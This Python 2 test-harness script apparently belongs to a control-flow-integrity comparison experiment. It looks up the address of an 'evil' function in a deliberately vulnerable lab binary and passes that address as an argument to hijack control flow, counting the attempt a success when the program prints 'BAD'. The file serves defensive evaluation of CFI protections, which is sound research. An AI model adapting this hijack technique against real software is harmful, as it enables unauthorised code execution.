#
# Define the code which runs inside the test containers. 
#
# Use the run() function to list which hooks should run in which containers
# and in what order. Simply call H.run() as many times as needed. 
#
# Hooks can be any function in this file. 
#
import os, struct
from subprocess import *

PI = lambda x: struct.pack('I', x)
PQ = lambda x: struct.pack('Q', x)
UPQ = lambda x: struct.unpack('Q', x)[0]
TARGET = '/home/vuln'
#TARGET = '/home/insu/xshop/examples/CFI-comparison/containers/target/vuln'

def find_evil():
    p = Popen('readelf -a %s|grep evil' % TARGET, shell=True, stdout=PIPE)
    stdout = p.stdout
    return PQ(int(stdout.read(1000).split()[1], 16)).replace("\x00", "")

def exploit():
    os.putenv('LD_LIBRARY_PATH', '/home/gcc/usr/bin/lib64')
    evil = find_evil()
    p = Popen([TARGET, evil], stderr=PIPE)
    rc = p.wait()
    # SEGV or successfully exit
    if p.stderr.read(4) == "BAD\n":
        return 2 # exploit success
    else:
        return 0 # exploit fail

def run(H):
    H.run('target','run_exploit')

def run_exploit():
    return exploit()

if __name__ == '__main__':
    print "RETURN : %d" % exploit()
